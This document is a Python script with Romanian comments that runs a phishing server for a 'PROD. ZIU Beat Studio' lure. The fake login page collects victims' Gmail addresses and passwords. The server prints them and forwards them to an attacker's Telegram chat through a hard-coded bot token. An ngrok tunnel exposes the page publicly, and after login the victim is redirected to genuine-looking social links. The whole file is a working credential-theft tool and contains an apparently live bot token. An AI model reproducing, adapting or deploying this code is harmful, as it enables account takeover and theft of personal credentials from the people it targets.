import http.server
import urllib.request
import urllib.parse
import json
import subprocess
import atexit
import threading
import time

TELEGRAM_BOT_TOKEN = "8981599119:AAH22UeQDb2yrXdUYUjRExSKMpYZmrcG00s"
CHAT_ID = "8634613805"

def trimite_pe_telegram(mesaj):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": mesaj,
        "parse_mode": "HTML"
    }
    try:
        data = urllib.parse.urlencode(payload).encode('utf-8')
        req = urllib.request.Request(url, data=data, method='POST')
        with urllib.request.urlopen(req, timeout=5) as response:
            pass
    except Exception as e:
        print(f"[x] Eroare la trimiterea mesajului pe Telegram: {e}")

class CyberHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        
        html_login = """
        <!DOCTYPE html>
        <html lang="ro">
        <head>
            <meta charset="UTF-8">
            <title>PROD. ZIU | Beat Studio Login</title>
            <style>
                body {
                    background-color: #030307;
                    color: #00ff66;
                    font-family: 'Courier New', Courier, monospace;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    overflow: hidden;
                    position: relative;
                }
                canvas {
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    z-index: 1;
                    opacity: 0.12;
                    pointer-events: none;
                }
                .login-box {
                    position: relative;
                    z-index: 2;
                    background: rgba(10, 12, 24, 0.9);
                    border: 2px solid #00ff66;
                    box-shadow: 0 0 30px rgba(0, 255, 102, 0.35);
                    padding: 40px;
                    border-radius: 12px;
                    width: 340px;
                    text-align: center;
                    backdrop-filter: blur(6px);
                }
                h2 {
                    margin-bottom: 5px;
                    font-size: 1.8rem;
                    text-shadow: 0 0 12px rgba(0, 255, 102, 0.6);
                    letter-spacing: 2px;
                }
                .studio-tag {
                    color: #00cc55;
                    font-size: 0.8rem;
                    margin-bottom: 25px;
                    letter-spacing: 1px;
                }
                .input-group {
                    margin-bottom: 18px;
                    text-align: left;
                }
                label {
                    display: block;
                    font-size: 0.8rem;
                    margin-bottom: 5px;
                    color: #00cc55;
                }
                input {
                    width: 100%;
                    padding: 10px;
                    background: #000;
                    border: 1px solid #00ff66;
                    color: #fff;
                    border-radius: 5px;
                    box-sizing: border-box;
                    outline: none;
                }
                input:focus {
                    box-shadow: 0 0 12px #00ff66;
                }
                button {
                    width: 100%;
                    padding: 12px;
                    background: #00ff66;
                    color: #030307;
                    border: none;
                    font-weight: bold;
                    font-size: 1rem;
                    border-radius: 5px;
                    cursor: pointer;
                    margin-top: 10px;
                    transition: 0.3s;
                    letter-spacing: 1px;
                }
                button:hover {
                    background: #00cc55;
                    box-shadow: 0 0 20px #00ff66;
                }
                .error-msg {
                    color: #ff3333;
                    font-size: 0.8rem;
                    margin-top: 10px;
                    display: none;
                }
            </style>
        </head>
        <body>
            <canvas id="matrix"></canvas>
            <div class="login-box">
                <h2>PROD. ZIU</h2>
                <div class="studio-tag">[ BEAT & SOUND GATEWAY ]</div>
                <form method="POST" action="" onsubmit="return valideazaGmail(event)">
                    <div class="input-group">
                        <label>GMAIL:</label>
                        <input type="text" id="email" name="email" required placeholder="user@gmail.com">
                    </div>
                    <div class="input-group">
                        <label>PASSWORD:</label>
                        <input type="password" name="password" required placeholder="••••••••">
                    </div>
                    <div class="input-group">
                        <label>PRODUCER / USERNAME:</label>
                        <input type="text" name="username" required placeholder="numele_tau">
                    </div>
                    <button type="submit">ACCESEAZĂ STUDIOUL</button>
                    <div class="error-msg" id="err">Erore: Introdu un Gmail valid!</div>
                </form>
            </div>

            <script>
                function valideazaGmail(event) {
                    const emailInput = document.getElementById('email').value.trim();
                    const errDiv = document.getElementById('err');
                    
                    if (!emailInput.endsWith('@gmail.com') || emailInput.length <= 10) {
                        event.preventDefault();
                        errDiv.style.display = 'block';
                        return false;
                    }
                    errDiv.style.display = 'none';
                    return true;
                }

                const canvas = document.getElementById('matrix');
                const ctx = canvas.getContext('2d');
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                const letters = '0101010101PRODZIUBEATSOUNDWAVMP3';
                const fontSize = 14;
                const columns = canvas.width / fontSize;
                const drops = [];
                for (let x = 0; x < columns; x++) { drops[x] = 1; }
                function draw() {
                    ctx.fillStyle = 'rgba(3, 3, 7, 0.05)';
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                    ctx.fillStyle = '#00ff66';
                    ctx.font = fontSize + 'px monospace';
                    for (let i = 0; i < drops.length; i++) {
                        const text = letters.charAt(Math.floor(Math.random() * letters.length));
                        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) { drops[i] = 0; }
                        drops[i]++;
                    }
                }
                setInterval(draw, 33);
                window.addEventListener('resize', () => {
                    canvas.width = window.innerWidth;
                    canvas.height = window.innerHeight;
                });
            </script>
        </body>
        </html>
        """
        self.wfile.write(html_login.encode('utf-8'))

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        parsed_data = urllib.parse.parse_qs(post_data)
        
        email = parsed_data.get('email', ['N/A'])[0]
        password = parsed_data.get('password', ['N/A'])[0]
        username = parsed_data.get('username', ['N/A'])[0]
        
        print(f"\n[+] Sesiune nouă ZIU -> Gmail: {email} | Parola: {password} | User: {username}")
        
        mesaj_telegram = (
            f"<b>🎵 [PROD. ZIU] - SESIUNE NOUĂ</b>\n\n"
            f"<b>Gmail:</b> {email}\n"
            f"<b>Parola:</b> {password}\n"
            f"<b>Username:</b> {username}"
        )
        
        trimite_pe_telegram(mesaj_telegram)

        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        
        html_loading = """
        <!DOCTYPE html>
        <html lang="ro">
        <head>
            <meta charset="UTF-8">
            <title>Loading Studio...</title>
            <style>
                body {
                    background-color: #030307;
                    color: #00ff66;
                    font-family: 'Courier New', Courier, monospace;
                    display: flex;
                    flex-direction: column;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    overflow: hidden;
                    position: relative;
                }
                canvas {
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    z-index: 1;
                    opacity: 0.12;
                    pointer-events: none;
                }
                .terminal-box {
                    position: relative;
                    z-index: 2;
                    background: rgba(10, 12, 24, 0.9);
                    border: 2px solid #00ff66;
                    box-shadow: 0 0 30px rgba(0, 255, 102, 0.4);
                    padding: 30px;
                    border-radius: 10px;
                    width: 450px;
                    text-align: left;
                }
                h3 {
                    margin-top: 0;
                    color: #00ff66;
                    text-shadow: 0 0 10px rgba(0, 255, 102, 0.5);
                }
                .log-line {
                    font-size: 0.9rem;
                    margin: 8px 0;
                    opacity: 0.8;
                }
                .progress-bar {
                    width: 100%;
                    background: #000;
                    border: 1px solid #00ff66;
                    height: 20px;
                    margin-top: 20px;
                    position: relative;
                    border-radius: 3px;
                }
                .progress-fill {
                    height: 100%;
                    background: #00ff66;
                    width: 0%;
                    box-shadow: 0 0 10px #00ff66;
                    transition: width 0.2s ease;
                }
            </style>
        </head>
        <body>
            <canvas id="matrix"></canvas>
            <div class="terminal-box">
                <h3>[ PROD. ZIU // LOADING STEMS ]</h3>
                <div id="logs">
                    <div class="log-line">> Initializing audio drivers & plugins...</div>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" id="fill"></div>
                </div>
            </div>

            <script>
                const canvas = document.getElementById('matrix');
                const ctx = canvas.getContext('2d');
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                const letters = '0101010101PRODZIUBEATSOUNDWAVMP3';
                const fontSize = 14;
                const columns = canvas.width / fontSize;
                const drops = [];
                for (let x = 0; x < columns; x++) { drops[x] = 1; }
                function draw() {
                    ctx.fillStyle = 'rgba(3, 3, 7, 0.05)';
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                    ctx.fillStyle = '#00ff66';
                    ctx.font = fontSize + 'px monospace';
                    for (let i = 0; i < drops.length; i++) {
                        const text = letters.charAt(Math.floor(Math.random() * letters.length));
                        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) { drops[i] = 0; }
                        drops[i]++;
                    }
                }
                setInterval(draw, 33);

                const logsContainer = document.getElementById('logs');
                const fillBar = document.getElementById('fill');
                
                const steps = [
                    { text: "> Loading VST plugins & soundkits...", progress: 25 },
                    { text: "> Syncing Traktrain beat catalog...", progress: 50 },
                    { text: "> Establishing secure studio session...", progress: 75 },
                    { text: "> ACCESS GRANTED. Welcome to ZIU's Hub.", progress: 100 }
                ];

                let currentStep = 0;

                function runTerminal() {
                    if (currentStep < steps.length) {
                        let step = steps[currentStep];
                        setTimeout(() => {
                            logsContainer.innerHTML += `<div class="log-line">${step.text}</div>`;
                            fillBar.style.width = step.progress + '%';
                            currentStep++;
                            runTerminal();
                        }, 700);
                    } else {
                        setTimeout(() => {
                            window.location.href = "/success";
                        }, 1000);
                    }
                }

                runTerminal();
            </script>
        </body>
        </html>
        """
        self.wfile.write(html_loading.encode('utf-8'))

    def handle_success(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        
        html_success = """
        <!DOCTYPE html>
        <html lang="ro">
        <head>
            <meta charset="UTF-8">
            <title>PROD. ZIU - Official Hub</title>
            <style>
                body {
                    background-color: #030307;
                    color: #00ff66;
                    font-family: 'Courier New', Courier, monospace;
                    text-align: center;
                    display: flex;
                    flex-direction: column;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    overflow: hidden;
                    position: relative;
                }
                canvas {
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    z-index: 1;
                    opacity: 0.12;
                    pointer-events: none;
                }
                .content-box {
                    position: relative;
                    z-index: 2;
                    background: rgba(10, 12, 24, 0.9);
                    border: 2px solid #00ff66;
                    box-shadow: 0 0 35px rgba(0, 255, 102, 0.4);
                    padding: 35px;
                    border-radius: 12px;
                    width: 400px;
                }
                h1 {
                    font-size: 2rem;
                    margin-bottom: 5px;
                    text-shadow: 0 0 15px rgba(0, 255, 102, 0.6);
                    letter-spacing: 2px;
                }
                .subtitle {
                    color: #888;
                    font-size: 0.85rem;
                    margin-bottom: 25px;
                }
                .link-item {
                    display: block;
                    background: #000;
                    border: 1px solid #00ff66;
                    color: #00ff66;
                    text-decoration: none;
                    padding: 12px;
                    margin: 12px 0;
                    border-radius: 6px;
                    font-weight: bold;
                    font-size: 1rem;
                    transition: 0.3s;
                    box-shadow: inset 0 0 5px rgba(0, 255, 102, 0.2);
                    text-align: left;
                    padding-left: 20px;
                }
                .link-item:hover {
                    background: #00ff66;
                    color: #030307;
                    box-shadow: 0 0 20px #00ff66;
                }
            </style>
        </head>
        <body>
            <canvas id="matrix"></canvas>
            <div class="content-box">
                <h1>PROD. ZIU</h1>
                <div class="subtitle">[ OFFICIAL AUDIO & SOCIAL HUB ]</div>
                <a class="link-item" href="https://traktrain.com/ziu" target="_blank">🎵 Traktrain Beats</a>
                <a class="link-item" href="https://youtube.com/@prodziu7?si=iL3OTiDPAiUi1C6-" target="_blank">📺 YouTube Channel</a>
                <a class="link-item" href="https://www.instagram.com/prod.ziu?vrfl=b2VzM2wwaWJobW9w&utm_source=qr" target="_blank">📸 Instagram Profile</a>
                <a class="link-item" href="https://discord.gg/v2W8Aw8c" target="_blank">💬 Discord Community</a>
            </div>

            <script>
                const canvas = document.getElementById('matrix');
                const ctx = canvas.getContext('2d');
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                const letters = '0101010101PRODZIUBEATSOUNDWAVMP3';
                const fontSize = 14;
                const columns = canvas.width / fontSize;
                const drops = [];
                for (let x = 0; x < columns; x++) { drops[x] = 1; }
                function draw() {
                    ctx.fillStyle = 'rgba(3, 3, 7, 0.05)';
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                    ctx.fillStyle = '#00ff66';
                    ctx.font = fontSize + 'px monospace';
                    for (let i = 0; i < drops.length; i++) {
                        const text = letters.charAt(Math.floor(Math.random() * letters.length));
                        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) { drops[i] = 0; }
                        drops[i]++;
                    }
                }
                setInterval(draw, 33);
            </script>
        </body>
        </html>
        """
        self.wfile.write(html_success.encode('utf-8'))

    def handle_one_request(self):
        try:
            self.raw_requestline = self.rfile.readline(65537)
            if not self.raw_requestline:
                return
            if not self.parse_request():
                return
            
            if self.path == '/success':
                self.handle_success()
            else:
                if self.command == 'GET':
                    self.do_GET()
                elif self.command == 'POST':
                    self.do_POST()
            self.wfile.flush()
        except socket.timeout as e:
            self.log_error("Request timed out: %r", e)
            return

    def log_message(self, format, *args):
        return

def afiseaza_link_public():
    time.sleep(3)
    try:
        req = urllib.request.Request("http://127.0.0.1:4040/api/tunnels")
        with urllib.request.urlopen(req, timeout=3) as resp:
            data = json.loads(resp.read().decode('utf-8'))
            tunnels = data.get('tunnels', [])
            for t in tunnels:
                if t.get('proto') == 'https':
                    print("\n" + "=" * 60)
                    print(f" [!] LINKUL PUBLIC WEB (PROD. ZIU): {t.get('public_url')}")
                    print("=" * 60 + "\n")
                    return
    except Exception:
        pass
    print(" [!] Nu am putut prelua linkul automat de la ngrok.")

def porneste_ngrok():
    try:
        ngrok_proc = subprocess.Popen(["ngrok", "http", "8080"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        atexit.register(ngrok_proc.terminate)
        threading.Thread(target=afiseaza_link_public, daemon=True).start()
    except Exception as e:
        print(f"[!] Nu am putut porni ngrok automat: {e}")

def run_server(port=8080):
    porneste_ngrok()
    
    server_address = ('', port)
    httpd = http.server.HTTPServer(server_address, CyberHandler)
    print("=" * 60)
    print(f" [i] Serverul PROD. ZIU a pornit pe portul {port}")
    print(" [i] Se genereaza linkul public...")
    print("=" * 60)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[i] Server oprit.")

if __name__ == '__main__':
    run_server()